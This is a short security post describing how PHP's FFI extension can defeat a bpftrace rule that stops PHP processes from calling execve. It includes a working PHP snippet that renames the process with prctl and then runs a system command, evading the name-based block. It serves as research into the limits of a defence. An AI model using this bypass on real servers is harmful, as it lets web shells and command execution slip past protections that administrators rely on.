[@cr0nym](https://x.com/cr0nym) posted about using bpftrace to generically stop php from executing execve, preventing most generic web shells + command execution exploits:  
[Generic bpftrace-based RCE/webshell prevention technique for critical Linux network services](https://www.defensive-security.com/resources/generic-bpftrace-based-rcewebshell-prevention-technique-for-critical-linux-network-services)

some distros such as latest debian ship PHP with FFI enabled by default which means one can just call prctl to change the name of the forked process to bypass the blacklist. There are other methods incase prctl is added to the script left as an exercise to astute readers.  

```php
<?php
$ffi = FFI::cdef("
    int system(const char *command);
    int prctl(int option, const char *arg2, unsigned long arg3, 
              unsigned long arg4, unsigned long arg5);
");
$name = "ABAB";
$ffi->prctl(15, $name, 0, 0, 0);
$ffi->system('id');
?>

```
